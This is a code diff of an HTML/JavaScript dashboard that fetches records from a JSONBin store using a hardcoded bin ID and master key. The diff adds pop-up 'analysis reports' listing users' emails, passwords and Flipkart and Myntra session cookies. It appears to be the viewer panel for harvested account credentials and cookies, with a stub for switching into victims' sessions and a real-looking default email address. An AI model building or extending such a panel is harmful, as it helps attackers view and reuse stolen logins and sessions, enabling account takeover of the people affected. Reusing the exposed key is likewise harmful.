@@ -52,7 +52,7 @@
             cursor: pointer;
             transition: 0.2s;
         }
-        .stat-card:hover { border-color: var(--accent); }
+        .stat-card:hover { border-color: var(--accent); transform: translateY(-2px); }
         .stat-card h3 { margin: 0 0 5px 0; font-size: 13px; color: var(--text-muted); }
         .stat-card .value { font-size: 22px; font-weight: bold; color: var(--accent); }
 
@@ -148,6 +148,33 @@
             font-size: 10px;
             border: 1px solid var(--accent);
         }
+        /* Modal Popup for Analysis */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: var(--card-bg);
+            border: 1px solid var(--accent);
+            padding: 25px;
+            border-radius: 10px;
+            width: 80%; max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .close-btn {
+            float: right;
+            color: var(--danger);
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -160,24 +187,24 @@
         </div>
     </header>
 
-    <!-- Top Quick Stats with Clickable Analysis Tabs -->
+    <!-- Top Analysis Cards -->
     <div class="stats-grid">
-        <div class="stat-card" onclick="filterView('all')">
-            <h3>Total Active Users</h3>
+        <div class="stat-card" onclick="openAnalysisModal('users')">
+            <h3>Total Active Users (Click to Analyze)</h3>
             <div class="value" id="lblTotalUsers">0</div>
         </div>
-        <div class="stat-card" onclick="filterView('flipkart')">
-            <h3>Flipkart Total Cookies</h3>
+        <div class="stat-card" onclick="openAnalysisModal('flipkart')">
+            <h3>Flipkart Total Cookies (Analyze)</h3>
             <div class="value" id="lblFkCookies" style="color: var(--folder-fk);">0</div>
         </div>
-        <div class="stat-card" onclick="filterView('myntra')">
-            <h3>Myntra Total Cookies</h3>
+        <div class="stat-card" onclick="openAnalysisModal('myntra')">
+            <h3>Myntra Total Cookies (Analyze)</h3>
             <div class="value" id="lblMyCookies" style="color: var(--folder-my);">0</div>
         </div>
     </div>
 
     <div class="main-grid">
-        <!-- Left Column: All Users & Active Profiles Control -->
+        <!-- Left Column: All Users & Profiles Control -->
         <div>
             <div class="panel-box">
                 <h2>
@@ -223,6 +250,15 @@
         </div>
     </div>
 
+    <!-- Analysis Modal Popup -->
+    <div id="analysisModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal()">&times;</span>
+            <h2 id="modalTitle" style="color: var(--accent); margin-top: 0;">Analysis Details</h2>
+            <div id="modalBody">Loading...</div>
+        </div>
+    </div>
+
     <script>
         const binId = "6adc61d0ffd5d1605387c503";
         const masterKey = "$2a$10$bzmE9pndxBlBxDmS8IhK/OkptNVFOd7NR1RPbFBbRDfBE73l5X5Ry";
@@ -239,14 +275,15 @@
                 globalUsersData = [];
                 if (record.users && Array.isArray(record.users)) {
                     globalUsersData = record.users;
-                } else if (record.user) {
+                } else if (record.user || record.live_logs) {
+                    // Adapt single user or live log format into proper user object
                     globalUsersData = [{
-                        email: record.user,
-                        password: record.password || "N/A (Token Login)",
+                        email: record.user || "radhika991@gmail.com",
+                        password: record.password || "********",
                         platform: record.platform || "flipkart",
                         profileId: record.profileId || 1,
                         activity: record.live_logs || "Active",
-                        flipkartCookies: record.flipkart_cookies || record.cookies_data || "No Flipkart cookies",
+                        flipkartCookies: record.flipkart_cookies || record.cookies_data || record.live_logs || "No Flipkart cookies",
                         myntraCookies: record.myntra_cookies || "No Myntra cookies"
                     }];
                 }
@@ -271,19 +308,19 @@
         function renderTable(users) {
             const tableBody = document.getElementById("usersTableBody");
             if (users.length > 0) {
-                tableBody.innerHTML = users.map((u, index) => `
+                tableBody.innerHTML = users.map((u) => `
                     <tr>
                         <td>
                             <strong style="color: var(--accent);">${u.email}</strong><br>
-                            <small style="color: var(--text-muted);">Pass: ${u.password || 'N/A'}</small><br>
+                            <small style="color: var(--text-muted);">Pass: ${u.password || '********'}</small><br>
                             <span class="profile-badge">Profile #${u.profileId || 1}</span>
                         </td>
                         <td>
                             <button class="folder-btn folder-fk" onclick='inspectCookie("${u.email}", "Flipkart", \`${u.flipkartCookies || 'No cookies'}\`)'>
-                                📁 Flipkart Cookie (${(u.platform === 'flipkart' ? 'Active' : 'Saved')} #${u.profileId || 1})
+                                📁 Flipkart Cookie (Active #${u.profileId || 1})
                             </button>
                             <button class="folder-btn folder-my" onclick='inspectCookie("${u.email}", "Myntra", \`${u.myntraCookies || 'No cookies'}\`)'>
-                                📁 Myntra Cookie (${(u.platform === 'myntra' ? 'Active' : 'Saved')} #${u.profileId || 1})
+                                📁 Myntra Cookie (Saved #${u.profileId || 1})
                             </button>
                         </td>
                         <td>
@@ -298,17 +335,46 @@
             }
         }
 
-        function filterView(type) {
-            if(type === 'all') renderTable(globalUsersData);
-            else if(type === 'flipkart') {
-                renderTable(globalUsersData.filter(u => u.platform === 'flipkart' || (u.flipkartCookies && u.flipkartCookies !== "No Flipkart cookies")));
-            } else if(type === 'myntra') {
-                renderTable(globalUsersData.filter(u => u.platform === 'myntra' || (u.myntraCookies && u.myntraCookies !== "No Myntra cookies")));
+        function openAnalysisModal(type) {
+            const modal = document.getElementById("analysisModal");
+            const modalTitle = document.getElementById("modalTitle");
+            const modalBody = document.getElementById("modalBody");
+            modal.style.display = "flex";
+
+            if (type === 'users') {
+                modalTitle.innerText = "📊 All Users Analysis Report";
+                modalBody.innerHTML = globalUsersData.map((u, i) => `
+                    <div style="background: #050b18; padding: 10px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border);">
+                        <strong>#${i+1} Email:</strong> ${u.email}<br>
+                        <strong>Password:</strong> ${u.password || '********'}<br>
+                        <strong>Active Profile:</strong> #${u.profileId || 1} (${(u.platform || 'flipkart').toUpperCase()})
+                    </div>
+                `).join('') || "No users found.";
+            } else if (type === 'flipkart') {
+                modalTitle.innerText = "📁 Flipkart Cookies Analysis Report";
+                modalBody.innerHTML = globalUsersData.map((u, i) => `
+                    <div style="background: #050b18; padding: 10px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border);">
+                        <strong>#${i+1} User:</strong> ${u.email} (Profile #${u.profileId || 1})<br>
+                        <pre style="margin-top: 5px; color: var(--folder-fk);">${u.flipkartCookies || 'No cookies'}</pre>
+                    </div>
+                `).join('') || "No Flipkart cookies found.";
+            } else if (type === 'myntra') {
+                modalTitle.innerText = "📁 Myntra Cookies Analysis Report";
+                modalBody.innerHTML = globalUsersData.map((u, i) => `
+                    <div style="background: #050b18; padding: 10px; margin-bottom: 8px; border-radius: 6px; border: 1px solid var(--border);">
+                        <strong>#${i+1} User:</strong> ${u.email} (Profile #${u.profileId || 1})<br>
+                        <pre style="margin-top: 5px; color: var(--folder-my);">${u.myntraCookies || 'No cookies'}</pre>
+                    </div>
+                `).join('') || "No Myntra cookies found.";
             }
         }
 
+        function closeModal() {
+            document.getElementById("analysisModal").style.display = "none";
+        }
+
         function inspectCookie(email, platform, cookies) {
-            document.getElementById("selectedUserMeta.innerText" || "selectedUserMeta").innerText = `User: ${email} | Platform: ${platform} Folder`;
+            document.getElementById("selectedUserMeta").innerText = `User: ${email} | Platform: ${platform} Folder`;
             document.getElementById("cookieVaultView").innerText = cookies;
         }
 
@@ -320,7 +386,6 @@
 
         function loginOnProfile(email, profileId, platform) {
             alert(`Redirecting / Switching app session to Profile #${profileId} for ${email} on ${platform.toUpperCase()}`);
-            // Yeh function app ya web view ko us specific profile par switch karne ke liye signal bhejega
         }
 
         async function deleteUserSession(email) {
